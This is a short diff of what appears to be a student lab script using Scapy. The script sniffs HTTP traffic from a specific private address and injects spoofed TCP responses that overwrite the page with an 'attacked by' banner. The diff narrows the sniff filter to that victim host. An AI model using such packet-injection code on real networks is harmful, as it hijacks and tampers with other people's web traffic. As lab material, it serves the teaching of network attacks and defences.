@@ -7,6 +7,7 @@ Connection: keep-alive\r
 Accept-Ranges: bytes\r
 attacked by 2017011313\r
 \r
+
 '''
 
 
@@ -21,7 +22,7 @@ def attack(req):
     resp[TCP].flags = 'AP'
     resp[TCP].src = req[TCP].dst
     resp[TCP].dst = req[TCP].src
-    send(resp)
+    send(resp, verbose=1, count=1)
 
 
-sniff(prn=attack, store=0)
+sniff(prn=attack, filter='tcp and tcp port 80 and ip src 10.0.3.28', store=0)
